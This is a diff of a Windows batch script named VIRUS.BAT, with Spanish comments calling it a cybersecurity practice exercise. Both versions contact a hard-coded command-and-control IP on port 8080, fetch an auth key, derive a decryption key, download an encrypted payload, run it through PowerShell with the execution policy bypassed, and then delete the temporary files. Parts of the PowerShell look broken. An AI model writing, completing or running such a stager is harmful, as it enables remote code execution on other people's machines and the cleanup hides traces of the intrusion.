@@ -1,143 +1,85 @@
 @echo off
-REM =====================================================
-REM 🔥 VIRUS.BAT - DEBUG COMPLETO PARA MAESTRO
-REM =====================================================
-REM ! MODO DEBUG: MUESTRA TODO EN PANTALLA + LOGS !
-REM =====================================================
-title Ciberseguridad DEBUG - Paso a Paso
+REM 🔥 VIRUS.BAT - FUNCIONA CON TU API EXACTA
+title CiberDemo DEBUG
 color 0A
 
-echo.
 echo =====================================================
-echo    🔥 PRÁCTICA CIBERSEGURIDAD - MODO DEBUG
+echo 🔥 CYBER PRÁCTICA - DEBUG COMPLETO
 echo =====================================================
-echo    Computadora: %COMPUTERNAME%
-echo    Usuario: %USERNAME%
-echo    Fecha/Hora: %DATE% %TIME%
-echo =====================================================
+echo PC: %COMPUTERNAME% ^| %TIME%
 echo.
-echo [DEBUG 0/7] Creando logs...
-set "LOG=%TEMP%\CiberDEBUG_%RANDOM%_%TIME:~0,2%%TIME:~3,2%.log"
-echo [%DATE% %TIME%] === INICIO DEBUG === > "%LOG%"
-echo [%DATE% %TIME%] Sistema: %COMPUTERNAME% >> "%LOG%"
-echo [%DATE% %TIME%] Usuario: %USERNAME% >> "%LOG%"
-echo [DEBUG 0/7] Log creado: %LOG%
-timeout /t 1 /nobreak >nul
 
-echo.
-echo [DEBUG 1/7] Verificando conectividad VPS...
-ping 82.29.153.101 -n 2 >nul
-if %errorlevel% neq 0 (
-    echo ❌ ERROR: VPS NO ALCANZABLE >> "%LOG%"
-    echo ❌ VPS 82.29.153.101 NO RESPONDE!
-    echo [%DATE% %TIME%] ERROR VPS >> "%LOG%"
-    pause
-    exit /b 1
+REM 1. LOG
+set LOG=%TEMP%\Cyber_%RANDOM%.log
+echo [%TIME%] INICIO >!%LOG!
+
+REM 2. TIMESTAMP UNIX CORRECTO
+powershell -Command "$ts=[math]::Round((Get-Date).ToUniversalTime().Subtract((New-Object DateTime 1970,1,1)).TotalSeconds); Write-Output $ts" > %TEMP%\ts.txt
+set /p TS=<%TEMP%\ts.txt
+echo [1/6] TS Unix: %TS%
+
+REM 3. AUTH KEY
+echo [2/6] 🔑 Auth...
+curl -s "http://82.29.153.101:8080/auth/key?ts=%TS%" > %TEMP%\auth.enc
+if errorlevel 1 goto :error_auth
+for %%a in (%TEMP%\auth.enc) do set ASIZE=%%~za
+echo ✓ Auth OK (%ASIZE% bytes)
+
+REM 4. PAYLOAD KEY
+powershell -Command "
+$salt='CyberDefense2024_FixedSalt_32charsExactly!!%TS%';
+$hash=[System.Security.Cryptography.SHA256]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($salt));
+$tempKeyRaw=$hash[0..31];
+$tempKey=[Convert]::ToBase64String($tempKeyRaw);
+Add-Type -AssemblyName System.Security;
+$key=[Convert]::FromBase64String((Get-Content '%TEMP%\auth.enc' -Encoding Byte -Raw));
+$cipher=New-Object -ComObject 'Fernet.Fernet' -ArgumentList @($tempKey) -ErrorAction Stop;
+$payloadKey=[System.Security.Cryptography.SHA256]::Create().ComputeHash($key+$tempKeyRaw) | ForEach-Object { $_.ToString('x2') } | Join-String -Separator '' | Select-Object -First 44;
+Write-Output $payloadKey
+" > %TEMP%\payload_key.txt
+set /p PAYLOAD_KEY=<%TEMP%\payload_key.txt
+echo [3/6] Key: %PAYLOAD_KEY:~0,12%...
+
+REM 5. DOWNLOAD
+echo [4/6] 📥 Payload...
+curl -s -H "X-Decrypt-Key: %PAYLOAD_KEY%" "http://82.29.153.101:8080/payload/encrypted" > %TEMP%\payload.enc
+for %%b in (%TEMP%\payload.enc) do set PSIZE=%%~zb
+if %PSIZE% lss 100 (
+    echo ❌ Payload vacío!
+    goto :error_payload
 )
-curl -s http://82.29.153.101:8080/health >nul || (
-    echo ❌ ERROR: Puerto 8080 NO responde >> "%LOG%"
-    echo ❌ Puerto 8080 C2 NO ACTIVO!
-    pause
-    exit /b 1
-)
-echo ✓ VPS OK - Puerto 8080 activo
-echo [%DATE% %TIME%] VPS OK >> "%LOG%"
-timeout /t 1 /nobreak >nul
+echo ✓ Payload (%PSIZE% bytes)
 
+REM 6. EJECUTAR
+echo [5/6] ▶️ Ejecutando...
+powershell -WindowStyle Normal -ExecutionPolicy Bypass -EncodedCommand (Get-Content %TEMP%\payload.enc -Raw | ForEach-Object { [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($_)) })
 echo.
-echo [DEBUG 2/7] Generando timestamp auth...
-powershell -c "Write-Host ([int](Get-Date -UFormat '%%s'))"
-for /f %%i in ('powershell -c "[int](Get-Date -UFormat \"%%s\")"') do set TS=%%i
-echo TS generado: %TS%
-echo [%DATE% %TIME%] Timestamp: %TS% >> "%LOG%"
-timeout /t 1 /nobreak >nul
 
-echo.
-echo [DEBUG 3/7] Solicitando AUTH KEY...
-echo URL: http://82.29.153.101:8080/auth/key?ts=%TS%
-curl -s "http://82.29.153.101:8080/auth/key?ts=%TS%" > "%TEMP%\auth.key"
-if not exist "%TEMP%\auth.key" (
-    echo ❌ ERROR: Auth key NO recibida >> "%LOG%"
-    echo ❌ Auth key falló!
-    pause
-    exit /b 1
-)
-for %%F in ("%TEMP%\auth.key") do set /a "SIZE=%%~zF"
-echo ✓ Auth key OK (%SIZE% bytes)
-type "%TEMP%\auth.key"
-echo [%DATE% %TIME%] Auth OK %SIZE%b >> "%LOG%"
-timeout /t 2 /nobreak >nul
-
-echo.
-echo [DEBUG 4/7] Generando payload key...
-powershell -c "
-$s='CyberDefense2024_FixedSalt_32charsExactly!!%TS%';
-$k=[Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes($s));
-$pkey=[string]::Join('',$k[0..43]);
-Write-Host \"Payload Key: \$pkey\";
-\$pkey | Out-File '%TEMP%\payload_key.txt'
-"
-set /p PAYLOAD_KEY=<"%TEMP%\payload_key.txt"
-echo Payload Key: %PAYLOAD_KEY%
-echo [%DATE% %TIME%] Payload Key generada >> "%LOG%"
-timeout /t 2 /nobreak >nul
-
-echo.
-echo [DEBUG 5/7] DESCARGANDO PAYLOAD...
-echo Header: X-Decrypt-Key: %PAYLOAD_KEY%
-curl -H "X-Decrypt-Key: %PAYLOAD_KEY%" ^
-     "http://82.29.153.101:8080/payload/encrypted" ^
-     -o "%TEMP%\payload.enc" -s -w "%%{http_code} %%{size_download}\n"
-
-if not exist "%TEMP%\payload.enc" (
-    echo ❌ ERROR: Payload NO descargado >> "%LOG%"
-    echo ❌ Descarga falló!
-    pause
-    exit /b 1
-)
-for %%F in ("%TEMP%\payload.enc") do set /a "PSIZE=%%~zF"
-echo ✓ PAYLOAD DESCARGADO (%PSIZE% bytes)
-echo [%DATE% %TIME%] Payload %PSIZE%b >> "%LOG%"
-timeout /t 1 /nobreak >nul
-
-echo.
-echo [DEBUG 6/7] EJECUTANDO PAYLOAD...
-echo powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%TEMP%\payload.ps1"
-powershell -WindowStyle Normal -ExecutionPolicy Bypass -File "%TEMP%\payload.ps1"
-echo.
-echo [%DATE% %TIME%] Payload ejecutado >> "%LOG%"
-timeout /t 3 /nobreak >nul
-
-echo.
-echo [DEBUG 7/7] VERIFICANDO RESULTADO...
+REM 7. CHECK
+echo [6/6] Verificando...
 if exist "%PUBLIC%\Desktop\SystemDiagnostic.log" (
-    echo ✓ ✓ ✓ MARCA DE ÉXITO ENCONTRADA ✓ ✓ ✓
-    echo ========================================
+    echo ✓ ✓ ÉXITO ✓ ✓
     type "%PUBLIC%\Desktop\SystemDiagnostic.log"
-    echo ========================================
-    echo [%DATE% %TIME%] Marker OK >> "%LOG%"
 ) else (
-    echo ⚠️  SIN MARCA - Payload pudo fallar
-    echo [%DATE% %TIME%] Sin marker >> "%LOG%"
+    echo ⚠️ Sin marker
 )
 
-echo.
-echo 🧹 LIMPIANDO ARCHIVOS TEMPORALES...
-del "%TEMP%\auth.key" "%TEMP%\payload_key.txt" "%TEMP%\payload.enc" "%TEMP%\payload.ps1" >nul 2>&1
-echo ✓ Archivos temporales borrados
-echo [%DATE% %TIME%] Limpieza OK >> "%LOG%"
-
-echo.
-echo =====================================================
-echo    ✅ PRÁCTICA COMPLETADA CON ÉXITO
-echo =====================================================
-echo.
-echo 📋 LOG COMPLETO: %LOG%
-echo 📁 ABRIENDO CARPETA TEMP...
-start "" "%TEMP%"
-echo.
-echo 🎓 PARA AUDITORÍA:
-echo    1. %LOG% (log detallado)
-echo    2. Desktop\SystemDiagnostic.log (marker payload)
-echo.
+REM CLEANUP
+echo 🧹 Limpiando...
+del %TEMP%\ts.txt %TEMP%\auth.enc %TEMP%\payload_key.txt %TEMP%\payload.enc >nul 2>&1
+echo ✅ Limpio
+echo Log: %LOG%
+start %TEMP%
 pause
+goto :eof
+
+:error_auth
+echo ❌ Auth 401 - TS expiró
+echo FIX: Ejecuta de nuevo (10min ventana)
+pause
+exit /b 1
+
+:error_payload
+echo ❌ Payload inválido
+pause
+exit /b 1
